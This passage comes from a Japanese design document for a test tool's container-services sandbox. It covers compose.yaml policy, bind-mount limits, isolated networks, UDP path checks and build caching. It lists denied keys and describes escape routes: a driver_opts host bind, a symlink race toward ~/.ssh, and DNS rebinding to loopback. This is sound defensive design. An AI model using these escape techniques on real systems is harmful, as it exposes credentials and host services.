  守れない = 既存の伏せ字化と同じ限界)
- **起動完了の待ち(`healthcheck`)は fleetest が持つ** —— Apple Container の `container run` にはヘルスチェックが
  無い(help で確認)。どちらのランタイムでも、`healthcheck.test` を exec で繰り返し実行して待つ。
  `depends_on` の `condition: service_healthy` もこの待ちで満たす
- **ランタイムの選び方**: マシン側の設定 `services.runtime`(`docker` / `apple`)。無ければ、使えるものが
  **ちょうど1つのときだけ**それを使う。両方使える・どちらも無いときは、候補を言って止める
  (`XcodeSelection` の「ちょうど1件一致のときだけ採る」と同じ。黙って片方へ倒さない)
- **ランタイムの実体は親が解決する**(Docker は `PATH` と既知の置き場 = Docker Desktop・Rancher Desktop の
  `~/.rd/bin`・Homebrew / Apple Container は `container`。ssh 越しは非対話 PATH の補正を写す)。
  **Docker の接続先はこの Mac の unix ソケットだけ**(`DOCKER_HOST` / context が `tcp://` や別ホストなら止める —— bind の元の
  パスも公開ポートもそのホストのものになり、この Mac での実体パスの検査と `127.0.0.1` への到達の判断が成り立たない。
  Codex レビュー 2026-10-14 #8)。解決した接続先は控えに書き、孤児の回収まで固定する。**`DOCKER_CONFIG` は fleetest 専有のディレクトリに向け**、
  利用者の `~/.docker/config.json` から写すのは `auths` / `credsStore` / `credHelpers` だけ(`proxies` は写さない —— Docker は
  そこにある認証つきプロキシ URL をコンテナの環境とビルド引数へ**自動で注入する**ので、ビルド元に秘密を置かなくても
  Dockerfile から読める。Codex レビュー 2026-10-14 #2。写し方は要確認)。**資格情報の写しと env-file の置き場は、子が読めない
  親専用の領域**(Codex レビュー2 2026-10-14 #2): `~/.config/fleetest/private/<run の pid>/`(`secrets/` と同じく、再開の規則より後で `file-read*` を
  閉じる。`.fleetest/` や `~/.fleetest/` の下は子が書ける・読めるので置かない。0600 では同じ OS ユーザーの子を防げない)。
  run の終わりに消し、残骸は `hooks reap` が死んだ pid のぶんを消す。**終了コードを見る**
  (`Shell.Result.outputIfSucceeded`)。Apple Container の apiserver が止まっていたら、**カーネルが導入済みなら
  `container system start` を fleetest が撃つ**(M1Ultra で ssh 越し・非対話で通った。撃かないとランナー機の再起動の
  たびに人手が要る)。**未導入なら止めて案内する**(カーネルの取得は人が決める)。**`container` CLI は最低版の門を置く**
  (実測は 1.1.0。若い CLI で `inspect` の JSON の形が変わりうる。門は `BridgeContractTests` と同じく「落ちたらそこで上げる」)
- **名前はプロジェクト単位で固定**: `fleetest-<ワークスペースの実体パスの SHA-256 先頭12桁>-<サービス名>`
  (ネットワークも同じ接頭辞)。run 同士は dispatch.lock で1本・`services up` との直列化は `services.lock`(上の調停)。
  **世代の排他の根拠は `services.lock` と控えの照合**(Codex レビュー4 2026-10-14 #3)。名前が固定なので同名のコンテナの作成は衝突するが、
  それは補助に過ぎない(旧世代の `db` が残ったまま新しい宣言が `api` に変わっていれば衝突しないし、Docker は同名の
  ネットワークの重複を保証しない)。片付けは接頭辞で列挙し、控えの世代・資源 ID で照合して消す(下の「片付けの保証」)

#### compose.yaml の検査(親・純粋関数 `ComposePolicy`)

- **許可リスト**(全拒否の土台と同じ。知らないキーは断る): サービスの `image` / `build` / `command` /
  `entrypoint` / `environment` / `env_file`(`scripts/` の中だけ)/ `ports` / `expose` / `volumes` / `tmpfs` /
  `healthcheck` / `depends_on` / `working_dir` / `user` / `networks`(この compose が定義したものだけ)/
  `labels` / `platform` / `init` / `stop_grace_period` / `mem_limit` / `cpus`(資源の上限。Apple Container は
  `-m` / `-c`・Docker は `--memory` / `--cpus` へ写す。**Apple の既定は1コンテナ 4 CPU・1 GiB** なので、重いサーバーは
  書かないと足りなくなりうる。sut-ec-mobile の Kotlin のサーバーは既定で動いた)/ `build.target`(多段ビルドで普通に使う)。
  トップレベルは `services` / `networks` / `volumes`。**`volumes.*` は名前だけ**(`driver` / `driver_opts` / `external` は断る ——
  Docker の `local` ドライバは `driver_opts: {type: none, o: bind, device: /Users/…}` で**任意のホストのパスを名前付き
  ボリュームとして bind できる** = bind マウントの元の検査がすり抜ける。レビュー 2026-10-14)。**`version:`(古い書き方)は
  無視して通す・`x-*`(拡張欄)も無視**(断ると既存の compose.yaml がほぼ全部落ちる。無視したことは起動時に1行言う)。
  **許可は全階層でキー・型・値を表にし、短縮形と長い形を正規化してから検める**(Codex レビュー 2026-10-14 #18): `build.privileged` /
  `build.entitlements` / `networks.*.name` / `ipam` / `services.*.networks.*.aliases`(予約名への別名)等は断る。YAML の
  merge キーと重複キーの扱い・未宣言のボリューム・親の管理用マウント先(`/etc/hosts`)やラベルの名前空間との衝突も検査に載せる
- **断るもの**: `privileged`・`cap_add`・`devices`・`security_opt`・`sysctls`・`cgroup_parent`・
  `network_mode` / `pid` / `ipc` / `uts` / `userns_mode`・`container_name`(名前の固定が崩れる)・
  `external` のネットワーク / ボリューム(他のプロジェクトへ届く)・`extra_hosts`(名前の解決は fleetest が持つ)・
  `restart`(片付けた後に起き直す)・`networks.*.internal: false` と `driver` / `driver_opts`(外へ出られない
  ネットワークを崩す)・`volumes.*.driver` / `driver_opts`(上)。**サービス名は文法を検める**(`[a-z0-9][a-z0-9_.-]*`・
  `localhost` と `host.docker.internal` は断る = hosts ファイルと DNS の別名に載る名前)。Apple Container に固有の口(`--virtualization`・`--publish-socket`)は計画が作らないので
  書く場所が無い
- **bind マウントの元は `<workspace>/scripts/` と `<workspace>/data/` の中だけ**(実体パスで照合。
  ランタイムのソケット・`/`・ホームそのものは当然この外)。名前付きボリュームは VM の中なので許す。
  **`scripts/` のマウントは読み取り専用を強制**(`data/` はファイルの資材の置き場で書ける)。**書ける場所の配下はマウント元に
  しない**(Codex レビュー 2026-10-14 #7・Codex レビュー2 2026-10-14 #3): `data/` を書けるコンテナ A が `data/x` を `~/.ssh` への symlink に替えると、
  後から起動する B の宣言 `./data/x:/m` は、実体パスを直前に取り直して渡しても**ランタイムがその文字列を開く時点で差し替え
  られる**(再検査では競争を閉じられない)。だから **`data/` のマウント元は `data/` そのもの(根)だけ**とし、配下のパスは
  断る。`scripts/` とビルド元は誰も書けないので配下も可。`scripts/`・`data/`・ビルド元そのものが symlink なら起動しない
  (`prepareWritableRoots` と同じ)。直前の実体パスの取り直しは補助として行う(保証ではない)。Apple のビルドで宣言どおりの
  表記を渡す例外は build context だけに限る
- **DB のデータは bind マウントに置かず、名前付きボリュームに置く**と案内する(実測 2026-10-14)。PostgreSQL 16 の
  データを `data/` の下へ bind マウントすると、**Apple Container では起動しない**(`chmod` / `chown` が
  `Operation not permitted`)。Docker(Rancher Desktop・virtiofs)は動き、作り直しても残った。Apple の名前付き
  ボリュームは ext4 で直下に `lost+found` があり、PostgreSQL は「空でない」で止まる → **`PGDATA` をボリュームの下の
  フォルダにすれば動き、作り直しても残った**(両ランタイムで同じ書き方が通る形として案内する)。
  名前付きボリュームもプロジェクトの接頭辞で名付け、**既定は残す**(ユーザー決定 2026-10-14。巨大なテストデータの
  読み込みを run ごとに払わない)。片付け(正常系・孤児の回収)はコンテナとネットワークだけを消し、ボリュームは消さない。
  **前の run の変更は run-setup.sh で戻す**(下の「巨大なテストデータの戻し方」)。全部を消すのは人が打つ
  `fleetest services reset`(枠の外。そのプロジェクトの接頭辞のコンテナ・ネットワーク・ボリューム)。残すことの注意:
  run の順序に依存する失敗が出やすい・**ランナー機ごとに別の DB になる**(どちらも run-setup.sh で毎回そろえれば防げる)・
  消さない限り溜まる。ボリュームごと作り直す中継の操作(サービスを止めて消して作り直して待つ)は要る場面が出たら足す。
  **残したボリュームとイメージの大版上げ**(postgres 16 → 17)が組むと DB が起動しない → ボリュームのラベルに使った
  イメージの digest を記録し、変わっていたら**「前回と違うイメージで起動する」と観測として言う**(大版上げかどうかは
  ツールには分からない = reset の要否は利用者の判断。Codex レビュー 2026-10-14 #27)。
  **Apple の名前付きボリュームは作るときに大きさ(`-s`)が要る**(compose に欄が無い。実測では 40G を手で指定した)→
  既定値は根拠・単位・尽きたときの発話つきで名前を付けて1箇所に置き、`x-fleetest` 的な宣言は置かない(未決の定数 =
  実装のときに Apple の既定値を調べてから決める)
- Apple Container のマウントの元が `/private/tmp/…` でも中身は見える(実測。ビルドの中身の転送だけが空になる)
- **`data/` はリモートでは「入力」**(レビュー 2026-10-14): ワークスペースごと転送されるので、**ディスパッチのたびに
  ランナー機の `data/` は手元の内容で上書きされる**(ランナー機で run-setup.sh が書いた状態は次の dispatch で消える)。
  巨大なダンプは `.fleetest-transfer-ignore` に書いてランナー機に直接置く。run をまたいで残す状態は名前付きボリュームへ
- **`build`**: `context` は `<workspace>/scripts/` の中か、**マシン側の設定 `services.buildSources` で名指しした
  読み取り専用のビルド元**の中だけ(どちらも枠の中のスクリプトが書けない場所。`data/` に置くと、前の run の run-setup.sh が
  次のビルドの Dockerfile を仕込める。ビルド元を広げられるのはマシン側だけ = プロジェクトから広げない)。`dockerfile` は context の中だけ。
  **断る**: `ssh`(Mac の SSH エージェントをビルドへ渡せる)・`secrets`(Mac のファイル・環境変数を渡せる)・
  `additional_contexts`・`network` の `none` 以外。`args` に秘密を書かないことはドキュメントで言う(検査では見分けられない)
- **ポートの公開は `127.0.0.1` だけ**。`host_ip` の省略(= 0.0.0.0)は断る(書き換えて通すと、利用者は
  LAN に出したつもりで出ていない状態を知らないまま使う)。**`/udp` の公開は許す**(UDP を使うアプリ = ゲーム・
  音声・独自の探索などをテストするため。到達性は下の「ネットワーク」の表)。**ホストのポートの予約範囲は断る**
  (レビュー 2026-10-14): ブリッジのポート(8123〜)・adb サーバ(`ANDROID_ADB_SERVER_PORT`、既定 5037)・Emulator
  (5554〜5585)・親のプロキシと UDP 確認用のポート。範囲は名前付きの定数1箇所(既存の `AdbPolicy` / ブリッジの定数を参照し、
  新しい数字を置かない)。予約外の衝突(別のプロジェクトの `services up` が握っている等)は、起動の失敗に**握っている
  プロセス**(`lsof -nP -iTCP:<p> -sTCP:LISTEN`)を添えて止める
- **実機(物理端末)でもテストできるようにする**(ユーザー決定 2026-10-14。方式は推奨の (b)+(c)。**同日に実機で実測** =
  iPhone SE3・Pixel 4a(Android 13・USB)・LAN の対向は M1Ultra。ファイアウォールは ON のまま):
  iPhone の実機から Mac の `127.0.0.1` には届かない(端末自身)。
  - **(c) Android の実機: 親が `adb reverse tcp:<p> tcp:<p>` を代行する**(利用者のスクリプトではなく fleetest が、
    レーンの端末に対して、宣言した TCP の公開ポートごとに)。端末のアプリは `127.0.0.1:<p>` で届く = **Simulator 向けと
    同じ接続先のビルドがそのまま使える**。撃つのはワーカーがその端末に付いたとき(serial が確定する場所)、解除
    (`adb reverse --remove`)はレーンの終わり。**`adb reverse` は TCP だけ**(`reverse udp:` は「unknown socket
    specification」で断られる = 実測)。Emulator には撃たない(`10.0.2.2` で届く)。親が撃つので `AdbPolicy`(子の代行の
    方針)は変えない。LAN には出ない。**実測**: Pixel 4a の Chrome が `127.0.0.1:<p>` → reverse → Mac の `127.0.0.1:<p>` の
    コンテナに届いた(httpd のログに要求が出た)。`--remove` で消え、消した後は Connection refused。
    **既存の reverse を上書きしない**(`--no-rebind`)。**張る前に `adb reverse --list` で宛先を見る**: **同じ宛先(tcp:P → tcp:P)なら触らない**
    (控えにも書かない = `down` で外さない)・**別の宛先なら起動の失敗**(アプリがそちらへ届いて別のサーバーを検証し、緑になり得る =
    Codex レビュー 2026-10-15)・一覧が取れないデバイスは張りにいき、張れなければ警告(宛先が分からないので届く・届かないは言わない。
    run.json の `servicesWarnings`)。**解除に失敗した転送は残る = 既知の制約**(次の起動は同じ宛先なら触らず・公開ポートを変えたら
    旧い転送には何も言わない。人が `--list` → `--remove`。user-docs の services ページに書いてある)・自分が張った serial・ポート・世代を控えに
    書き、解除は自分のぶんだけ・孤児の回収にも解除を含める(Codex レビュー 2026-10-14 #23)。**reverse の先は Mac の `127.0.0.1`** なので、**そのポートは `127.0.0.1` でも待ち受けていること**(LAN アドレスだけで
    公開したポートには届かない = 実測)。運用の罠: **古い adb サーバーが USB の端末を拾っていなかった**(`adb devices -l` に
    Emulator しか出ず、`adb kill-server` で2台とも現れた)→ 実機が見えないときは最初にこれを疑う
  - **(b) iOS の実機と、Android の実機の UDP: Mac の LAN アドレスで公開する**。マシン側の設定
    `services.publishForPhysicalDevices`(機械の LAN アドレスを**名指し**。自動では選ばない = ちょうど1件でも書かせる)が
    有り、**かつ run に実機のレーンが含まれるときだけ**、そのポートを LAN へも公開する(compose.yaml は `127.0.0.1` のまま
    = プロジェクトから LAN へ出す口を持たない)。実機を含まない run は `127.0.0.1` のまま。アプリの接続先は
    `appPathPhysical` の build に LAN アドレスを焼く(既存の user-docs/fleet/adding_physical_devices_ja.md の案内と同じ)。
    **制約**(Codex レビュー 2026-10-14 #24): 同じ iOS の成果物を複数のランナー機に配ると、焼けるアドレスは1機械分だけ → **iOS 実機のレーンを
    含む run は1機械に限る**(`--fleet`・`--device-machine`・`api run` の機械分担の全経路で、配分の前に同じ判定を通す。Codex レビュー2 2026-10-14 #12)。アプリが実行時に接続先を選べるならこの限りでない
    (docs に書く)。**`services up --physical`**(マシン側 opt-in が前提)で LAN 公開と、`--serial` で名指しした Android 実機への
    reverse を所有者プロセスが持ち、`down` で解除する(Codex レビュー 2026-10-14 #25。無いと実機でのライブ操作・探索にサービスを出せない)
    **公開の形はランタイムで違う**(実測):
    **Apple** は `-p <LAN-IP>:p:cp` で**その IP だけ**に束縛できる(lsof は `192.168.20.96:18180`・`127.0.0.1` へは
    refused・LAN の対向と iPhone SE3 の Safari・Pixel 4a の Chrome から TCP が届き、UDP も LAN から届いた)→
    当初は **`127.0.0.1` と LAN アドレスの2つに公開する**つもりだったが、**同じホストポートの 2 重の公開は Apple が
    "host ports for different publish port specs may not overlap" で断る**(実測 2026-10-15・1.1.0)。`-p 0.0.0.0:p:cp`(と省略形)は
    `*:p` で待ち受けて loopback と両 LAN から届いた → **実機のレーンがあるときは Apple も Docker と同じ `0.0.0.0` に 1 つだけ公開する**
    (Simulator の `127.0.0.1` と実機の LAN の両方に届く。`lanAddress` は LAN へ出すことの同意の印)。
    **Docker(Rancher Desktop)は特定の IP に束縛できない**(`-p <LAN-IP>:…` は `cannot assign requested address` =
    束縛は VM の中で起きる)→ **`0.0.0.0` で公開する**(ホスト側は Lima の `ssh` が `*:p` で待ち受け、loopback と LAN の両方から
    届いた)= **全インターフェースに出る**(この Mac なら en0 の 10.0.0.104 側にも)。利用者向けに書く
  - **露出**: LAN 公開の間、同じ LAN の誰でもそのサービスに届く(ブリッジを LAN に出すときの「トークン」に当たる守りは、
    任意のサービスには置けない)。利用者向けには「実機のレーンを含む run の間と、`services up --physical` から `down` までだけ・
    名指しした機械でだけ・サービス側で認証を・Docker は全インターフェースに出る」と書く(Codex レビュー2 2026-10-14 #12)
  - **macOS のファイアウォール(ON で実測)**: Apple の公開を受けるのは `container-runtime-linux`(Homebrew の
    `libexec/container-plugins/…`)で、**初回の公開は LAN からも Mac 自身の LAN アドレスからも届かなかった**。数分後の
    2回目は届き、そのときには ALF の一覧に `container-runtime-linux`(Allow incoming connections)が**登録されていた**
    (ログは「KNOWN APP FLOW … verdict: 1」。ダイアログが出たかは見ていない = 自動で許可された可能性)。
    Docker の SSH の転送方式は Apple 署名の `ssh` が待ち受けるので初回から届いた。**gRPC の転送方式(UDP が要る方)の
    待ち受けプロセスが ALF にどう扱われるかは未実測**。user-docs/security/access_ja.md「fleetest はこの Mac で外向けの
    ポートを1つも開きません」の例外になる = docs を直す(「実機のレーンを含む run では、初回に許可を求められることがある」)
  - **確かめ方の罠**(再測定のため): Android の toybox `nc` は `printf … | nc` で要求を送らない(httpd 側に 408 だけ残る)→
    端末からの到達は **`am start -a android.intent.action.VIEW -d <url>`(ブラウザ)で開いて httpd `-vv` のログのパスで
    見る**。iPhone は `devicectl device process openURL`。公開の送信元は全部ゲートウェイの IP に変換されるので、
    **どの端末からかはパスで区別する**

#### ネットワーク(外へ出られない種類に固定する。2026-10-14 に両方で実測)

fleetest がプロジェクトごとに**外へ出られないネットワーク**を作り、全コンテナをそこにつなぐ。

| | Apple Container | Docker |
|---|---|---|
| 作り方 | `container network create --internal`(mode `hostOnly`) | `docker network create --internal` |
| 外への通信 | 止まる(IP 指定はタイムアウト・名前は引けない) | 止まる(Network is unreachable・名前は引けない) |
| 公開ポート(`127.0.0.1`) | そのまま効く | **効かない**(`docker port` が `invalid IP:0`)→ **中継のコンテナ**を足す |
| サービス名の解決 | **引けない**(通常のネットワークでも。引くには管理者権限の `container system dns create` が要る)→ fleetest が hosts ファイルを作って `/etc/hosts` へマウントする(1サービス・既知の IP で引けた。`:ro` は未実測)。**静的 IP は指定できない**(`--network` は `mac` / `mtu` だけ)ので、**IP は起動してから分かる** → 下の「hosts ファイルの作り方」。**hosts に無い名前・アドレスは `--dns 127.0.0.1` で即座に失敗させる**(既定の resolv.conf はゲートウェイを指すが外へ出られないネットワークでは誰も答えず、毎回 10〜20 秒の時間切れになっていた。実測 2026-10-15: Ktor の `remoteHost` の逆引きで全ログインが 10 秒遅れ → 0.01 秒。`--no-dns` は 1.1.1.1 を指して 20〜40 秒) | ネットワークの DNS で引ける —— **`--network-alias <サービス名>` を付けたときだけ**(コンテナ名は接頭辞つき。実測も alias で引いた) |
| 許可した宛先への通信 | 親のプロキシを**ゲートウェイの IP だけ**で待ち受けさせる(実測で、コンテナからは届き、Mac の `127.0.0.1` には出ない。**LAN からは未実測**。Seatbelt の `localhost` は自機の全アドレスを含むので**枠の中のシナリオ・スクリプトからは届く** = 同じ `allowedDomains` なので害は無い)。コンテナに `HTTP(S)_PROXY` を渡す | 中継のコンテナがプロキシへの道も通す(`host.docker.internal` → 親の `127.0.0.1` のプロキシ) |
| ssh 越しに起動したプロセスから | 公開ポート(TCP・UDP)・コンテナの IP・ゲートウェイの IP で待ち受けた親(= プロキシの道)の全部が通った(この Mac の ssh localhost と、**M1Ultra へ ssh したプロセス**。M1Ultra でも外への通信は止まり、通常のネットワークの対照では通った)。**JVM(Zulu 17)からも TCP・UDP・公開ポート・コンテナの IP の全部が通り**、上の「開始/終了スクリプト」の実害(java の `EHOSTUNREACH`)は既定のネットワーク(192.168.64.x)でも**再現しなかった**(2026-10-14 の M1Ultra。何が変わったかは不明 → 設計は `127.0.0.1` の公開ポートを使うので依らない) | **M1Max(Rancher Desktop 1.22.3)へ ssh したプロセスと JVM から、中継経由の TCP は届いた**。UDP は SSH の転送方式では届かず、gRPC では届いた。外への通信は止まった |
| IPv6 | 外へ出られない(通常のネットワークでもコンテナに外向きの IPv6 のアドレスも経路も無い。Mac は IPv6 で外へ出られる) | 同じ |
| UDP: Simulator(= Mac)/ Android Emulator(`10.0.2.2`)→ 公開した UDP | 届く | **Rancher Desktop の転送方式しだい**(下)。gRPC なら中継経由で届く |
| UDP: コンテナ同士(外へ出られないネットワークの中) | 届く | 届く |
| UDP: コンテナ → 外部(1.1.1.1 の DNS) | 止まる(通常のネットワークの対照では通る) | 止まる(同上) |

- **hosts ファイルの作り方**(Apple だけ。実測 2026-10-14): `depends_on` のトポロジカル順に起動し、**1つ起動するたびに
  親が hosts ファイルへその IP を追記する**。実測した性質: ①**単一のファイルは `-v <file>:/etc/hosts` でだけマウントできる**
  (`--mount type=bind` は「is not a directory」で断られる。読み取り専用は `-v` の `:ro` で付ける = 要確認)
  ②**同じ inode への追記(`>>`)は起動中のコンテナの中から即座に見え、その名前を引けた** ③**書き直し(新しい inode に
  書いて置き換える = エディタ風・atomic な上書き)は見えない** → 親は **O_APPEND で追記するだけ**にし、上書きしない
  (§11.7 の「上書きは atomic」はここには当てない。このファイルは親だけが書く)。**引けるのは先に起動した相手だけ**
  (相互参照は、後から起動した側の名前を先の側が起動時に引くと失敗する = Docker でも起動順の問題は同じ)。
  `localhost` は hosts に必ず置く
- **中継のコンテナ**(Docker だけ): 外へ出られないネットワークと通常のネットワークの両方につなぎ、宣言した
  ポートだけを `127.0.0.1` へ公開して中へ転送し、プロキシのポートだけを外へ転送する。**公開先はポートごとに決める**
  (Codex レビュー4 2026-10-14 #1): 実機のレーンを含む run と `up --physical` で `0.0.0.0` に差し替えるのは**宣言したサービスのポートだけ**で、
  UDP / TCP の確認用のエコーのポートは**常に `127.0.0.1`**(確認する経路が `127.0.0.1` なので、LAN に出す理由が無い)。**イメージと命令は
  fleetest が固定**する(利用者には書かせない)。実測では Docker Hub の `alpine/socat`(公式ではなく第三者の配布)を
  使った。**決定(ユーザー決定 2026-10-14): 公式の `alpine` を digest で固定し、`socat` を版を指定して入れる形で
  fleetest が手元でビルドする**(取得元が公式のイメージとパッケージだけになる。ビルドは初回だけ・外へ出られる。
  第三者のイメージを digest で固定するだけの案より信頼の置き場が少ない)。**起動は親が記録した image ID(digest)で行い、
  タグでは探さない**(`docker load` はタグも復元するので、利用者のアーカイブや build が中継のタグを上書きできる。
  Codex レビュー 2026-10-14 #6)。タグ・ラベル・コンテナ名の `fleetest-*` は予約し、利用者の compose が使ったら断る。実測で、中継を通しても
  中のコンテナは外へ出られないままだった
  **転送は両側とも `nodelay`(TCP_NODELAY)にする**(実測 2026-10-14)。付けないと POST のようにヘッダーと本文が
  分かれて届く要求で Nagle と遅延 ACK が噛み合い、**p99 が約 40 ms に張り付く**(sut-ec-mobile: p99 46 ms → 付けて 12 ms・
  上限の要求数 3,461 → 約 4,560/秒)。中央値は変わらないので、p50 だけ見ると気づけない
- **UDP の実測**(2026-10-14。UDP のエコーへ送って返事を見た。陽性対照 = 誰も待ち受けないポートは両方で届かない)。
  Simulator のアプリは Mac のネットワークをそのまま使うので Mac から送って確かめ、Android Emulator は中から `nc -u -q 3`
  で送った(Android の `nc` は UDP だと `-q` が無いと戻らない)。**Rancher Desktop は「SSH の転送方式」だと公開した UDP を
  Mac へ転送しない** —— `docker port` には `5000/udp -> 127.0.0.1:15001` と出るのに返事が来ない(同じコンテナの TCP は届く・
  コンテナの中では UDP のエコーが応答する)。この Mac(v1.24.0)は `experimental.virtualMachine.sshPortForwarder: true`
  (Lima のホストエージェントの環境が `LIMA_SSH_PORT_FORWARDER=true`)。SSH のトンネルは UDP を運べない。**`false`
  (gRPC の転送方式)にすると、直接の公開も中継経由も Emulator からも届いた**。Lima の転送規則は `proto: any`
  (rancher-desktop#9409 で UDP を足した。#8697 = SSH の方式は不具合の切り分け用の一時的な設定)
  → **中継は UDP も転送する**(`UDP-RECVFROM:<port>,fork UDP-SENDTO:<サービス>:<port>`)
- **UDP の経路の確認**(ユーザー決定 2026-10-14)。確かめないと、ランタイムが UDP を運ばないとき(`docker port` の表示は
  正常でエラーも出ない)テストが原因の見えないタイムアウトで落ち、アプリの不具合に見える。
  - **対象は経路だけ** = Mac の `127.0.0.1` → ランタイムの公開(+ Docker は中継)→ コンテナ。利用者のサービスが待ち受けて
    いるかはテストの側の問題で、確かめない(返事をしないサービスもある)。Android Emulator の `10.0.2.2` → Mac の
    `127.0.0.1` は Emulator の仕組みでランタイムと無関係(実測で届いた)なので含めない
  - **compose が `/udp` の公開を1つでも宣言したときだけ**、サービスの起動の後・run-setup.sh の前に1回。fleetest のエコー
    (中継と同じイメージ・`socat UDP-RECVFROM:<p>,fork EXEC:cat`)を外へ出られないネットワークに立てる。Apple は空いている
    UDP のポートを `127.0.0.1` へ公開、Docker は**中継に確認用のポートを最初から含めて**同じ経路(公開 → 中継 → エコー)を
    通す(中継のポートは作るときに決まる。**確認用のポートは実機のレーンを含む run でも `127.0.0.1` だけ**に公開する)。親が**毎回変わる乱数**を送り、同じ値が返るかを見る(関係のない応答を
    取り違えない)。1 s 待って無ければ送り直し、3 回まで。終わったらエコーを消す
  - **届かなかったときの文言は事実だけ**: 「127.0.0.1:<p>/udp(<ランタイム> が公開)へ 3 回送ったが返事が無かった」。
    **「同じ経路の TCP は届いた」は、エコーの TCP 側へも実際に送って確かめたときだけ書く**(エコーは TCP でも待ち受ける。
    Codex レビュー 2026-10-14 #28)。1 s × 3 回は名前付きの定数に根拠を書く(UDP の往復は LAN でも数 ms・VM の起動直後の取りこぼしを拾うための再送)。**原因は確かめられたときだけ添える** —— Rancher Desktop の設定ファイルとホストエージェントの環境変数
    (`LIMA_SSH_PORT_FORWARDER=true`)を読めたら、SSH の転送方式は UDP を運べないことと切り替え方
    (`rdctl set --experimental.virtual-machine.ssh-port-forwarder=false` の後、アプリを完全に終了して起動し直す)を出す。
    読めなければ原因を書かない
  - **最初は警告だけ**(「新しい検知はまず警告から」)。run の冒頭と結果の記録(注記)に残して進める。誤判定が無いことを
    実データで確かめてから run を止める形へ上げる
  - 費用: Apple 1〜2 s / run(コンテナごとに VM を起こす)・Docker 約 0.3 s / run。UDP を宣言しない compose では 0
  - 確かめないもの: 利用者のサービス自身・Emulator 側の経路・確認の後の run の途中でのランタイムの設定の変化
  - 採らなかった案: 利用者が送る中身と期待する返事を宣言する(返事をしないサービスで書けない)・設定を読むだけで判定する
    (知っている製品と設定にしか効かない = 上の文言で原因の確定にだけ使う)・確かめずに警告だけ出す(どの環境でも出て
    読まれなくなる)
- **プロキシは解決した IP を検める**(Codex レビュー 2026-10-14 #3): 既存の `SandboxProxy.route` は名前を照合して**名前のまま接続する**ので、
  許可した名前が `127.0.0.1` を返せば(DNS rebinding)親の loopback = ブリッジ・adb・TCP 公開した Docker API に届く。
  シナリオは `localhost:*` を直接開けているので今は広がらないが、**コンテナとスクリプトがプロキシを使う前に**、親で解決し
  loopback・自機のアドレス・リンクローカル・コンテナのゲートウェイとサブネットを断って**数値アドレスへ接続する**形に直す
  (docs/open-issues.md に載せた)。**コンテナの `NO_PROXY` には宣言したサービス名と内部のサブネットを入れる**(今の
  `SandboxProxy.environment` は `localhost,127.0.0.1,::1` だけ → `http://stub:8080` が親のプロキシへ行き、`allowedDomains` に無いので
  拒否される。Codex レビュー 2026-10-14 #26)。利用者の `environment` の同名の変数より fleetest の設定を優先する
- **コンテナ → 外部の UDP は止まったまま**(プロキシは HTTP の CONNECT だけ)。要るようになったら、マシン側の設定で
  宛先(IP とポート。UDP は名前で絞れない)を許し、親が中継する口を足す(今は作らない)
- **Rancher Desktop 1.22.3(M1Max)も同じ**: 既定は SSH の転送方式で UDP が届かず、gRPC にすると届いた。
  **`rdctl set` が 500 で失敗すると、設定ファイルには書かれるのに動いているアプリには効かない** —— VM を起動し直しても
  ホストエージェントは古い値(`LIMA_SSH_PORT_FORWARDER=true`)で起き、アプリを完全に終了して起動し直すと効いた
  (起動時に `this.cfg.experimental.virtualMachine.sshPortForwarder` から環境変数を組み立てる)。初回の起動は vmnet の
  導入で管理者のパスワードを求め、ssh 越しには進められない(画面の前で一度だけ)
- **プロジェクト同士は分かれている**(実測 2026-10-14)。外へ出られないネットワーク A のコンテナからは、同じ A の相手
  (対照)にだけ届き、別の外へ出られないネットワーク・通常(既定)のネットワークのコンテナ・別のネットワークのゲートウェイには
  両ランタイムとも届かなかった
- **Docker の通常のネットワークは、Mac の `127.0.0.1` に届く**(Rancher Desktop で実測。**届くかどうかは機械と転送方式で
  変わった** = M2 Ultra 1.24・SSH の方式で届き、M1Max 1.22.3 は SSH の方式で届かず gRPC で届いた。`host.docker.internal`
  経由で `127.0.0.1` だけで待ち受けるサービスに届いた = ブリッジ・adb サーバ)。**だから外へ出られない
  ネットワークの強制は Docker では必須**で、通常のネットワークにつなぐのは中継のコンテナだけにする
- **ビルドは外へ出られる**(両方で実測。ビルドは別の環境 = Docker は BuildKit・Apple Container は
  ビルド用のコンテナ `buildkit` が既定のネットワークにつながる)。依存は**ビルドのときにイメージへ入れる**
  と案内する(実行のときの `npm install` などは外へ出られずに落ちる)。ビルドの中の任意のコードが持ち出せるのは
  ビルドに使うフォルダ(`scripts/` か `services.buildSources`)とイメージの中身だけ。**`scripts/` とビルド元に秘密を
  置かない**と案内する
- **利用者向けの注意**(レビュー 2026-10-14): ①プロキシの環境変数を読まないクライアント(JVM の既定など)は外へ出られない
  (シナリオの `URLSession` と同じ性質)②外へ出られないネットワークでは**外部名の DNS 解決が失敗する**ので、起動時に
  外部名を引くサービス(テレメトリ・更新確認)は落ちうる(Apple は即座に失敗する。Docker は未実測)→ 切る設定をイメージに入れる

#### ビルドとデータ投入の規則(性能の実測から)

- **ビルドの中身が変わっていなければビルドを撃たない**。Apple Container はキャッシュが当たっても1回 1.3〜1.4 秒
  かかる(Docker は 0.18 秒)ので、run のたびに撃つと固定費になる。判定は**ビルドに使うフォルダの全ファイル +
  `dockerfile` + `args` の SHA-256**(`ServicePlan` が純粋関数で出す)をイメージのラベルに書き、同じタグのイメージの
  ラベルが一致すれば飛ばす。**対象は `.dockerignore` を適用した後のファイルだけ**(送られるものと一致させる。
  `services.buildSources` の clone は数 GB になりうる = sut-ec-mobile は 2.6 GB で、全部を読むと毎 run 数秒以上)。
  **`target`・`platform`・`args`・`dockerfile` の中身・ファイルの種類と権限も指紋に含める**(Codex レビュー 2026-10-14 #20)。サイズと mtime が前回と
  同じファイルは読み直さない(控えは `.fleetest/` に置く。**同サイズ・同 mtime の中身だけの変更は拾わない**と明記 = テストは
  サイズか mtime を変える)。**ベースイメージ(`FROM`)の更新はこの判定では拾わない**(キャッシュのビルドと同じ性質)
  → 利用者向けに「ベースを更新したいときは版を上げる」と書く
- **Apple Container はキャッシュが当たっても、ビルドに使うフォルダの中身を毎回すべて送り直す**(実測 2026-10-14)。
  sut-ec-mobile のサーバー(`COPY . .`)では毎回 241 MB・19.8 秒(キャッシュありのビルドが 25 秒。Docker は差分だけ送って
  0.5〜1.2 秒)。大半は `.dockerignore` に無い `dist/`(212 MB)。上の「撃たない」判定が Apple で特に効く。利用者向けには
  **`.dockerignore` で成果物・ビルド出力を外す**と案内する
- **Apple Container に `/private/` で始まるパスを渡さない**(実測 2026-10-14・container 1.1.0)。`container build` は
